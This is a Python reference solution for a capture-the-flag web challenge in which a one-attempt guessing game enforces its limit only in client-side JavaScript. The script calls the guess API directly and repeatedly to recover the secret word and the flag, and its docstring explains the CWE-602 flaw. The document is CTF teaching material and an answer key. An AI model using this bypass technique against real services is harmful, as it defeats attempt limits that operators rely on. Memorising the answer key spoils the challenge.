#!/usr/bin/env python3
"""
Five By Five - reference solution.

The browser page calls GET /api/session once on load to get a session_id,
then uses it for exactly one visible guess before disabling itself in
JavaScript -- "you've used your one attempt." That lock is purely
client-side: the session_id itself is just a string, and POST /api/guess
will keep honoring it forever, with no guess-count limit, no cookie, and
no requirement that the page that first fetched it ever be reloaded again.

This script calls /api/session once (exactly like the page's first load
does), then hits /api/guess directly and repeatedly with that same id,
playing the game as many times as it needs to, exactly like real Wordle,
using the service's own per-character feedback. It never touches the
browser at all. See solution.md for the write-up (CWE-602) and
verification notes.

Strategy, in plain terms:
  1. A "hit" or "present" result tells us a letter IS in the secret; an
     "absent" result tells us a letter is NOT in the secret at all, which
     prunes it from every remaining position at once.
  2. Maintain, for every alphabet letter, a global membership status
     (unknown / member / not-member) and, for every position, a shrinking
     candidate set plus letters already known-wrong at that position.
  3. Each round, build one guess that tests a fresh, still-unknown letter
     at every position that isn't solved yet, reusing solved positions'
     known letters as filler. Apply the feedback and repeat until every
     position is a confirmed hit.
"""
import sys

import requests

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
SECRET_LEN = 5


def get_session_id():
    resp = requests.get(f"{BASE_URL}/api/session", timeout=10)
    resp.raise_for_status()
    return resp.json()["session_id"]


def query(session_id, guess_str):
    resp = requests.post(
        f"{BASE_URL}/api/guess",
        json={"session_id": session_id, "guess": guess_str},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def solve():
    session_id = get_session_id()
    candidates = [set(ALPHABET) for _ in range(SECRET_LEN)]
    membership = {c: None for c in ALPHABET}  # None / True / False
    solved_letter = [None] * SECRET_LEN
    tried_at = [set() for _ in range(SECRET_LEN)]

    guesses_used = 0
    last_response = None

    while None in solved_letter:
        guess_chars = list(solved_letter)
        used_this_guess = {c for c in guess_chars if c is not None}

        for i in range(SECRET_LEN):
            if guess_chars[i] is not None:
                continue
            pool = [
                c for c in candidates[i]
                if c not in tried_at[i] and c not in used_this_guess and membership[c] is not False
            ]
            if not pool:
                pool = [c for c in candidates[i] if c not in used_this_guess]
            choice = sorted(pool)[0]
            guess_chars[i] = choice
            used_this_guess.add(choice)
            tried_at[i].add(choice)

        guess_str = "".join(guess_chars)
        result = query(session_id, guess_str)
        guesses_used += 1
        last_response = result

        if result.get("solved"):
            return guesses_used, result["flag"], guess_str

        for entry in result["feedback"]:
            i, c, outcome = entry["pos"], entry["char"], entry["result"]
            if outcome == "hit":
                solved_letter[i] = c
                candidates[i] = {c}
                membership[c] = True
                for j in range(SECRET_LEN):
                    if j != i and solved_letter[j] is None:
                        candidates[j].discard(c)
            elif outcome == "present":
                membership[c] = True
                candidates[i].discard(c)
            else:
                membership[c] = False
                for j in range(SECRET_LEN):
                    candidates[j].discard(c)

        if guesses_used > 40:
            raise RuntimeError(f"solver did not converge; last response: {last_response}")

    return guesses_used, None, "".join(solved_letter)


if __name__ == "__main__":
    count, flag, final_guess = solve()
    print(f"Recovered secret: {final_guess}")
    print(f"Guesses used (all via direct /api/guess requests, no browser): {count}")
    if flag:
        print(f"Flag: {flag}")
    else:
        print("WARNING: loop exited without an explicit 'solved' response.")
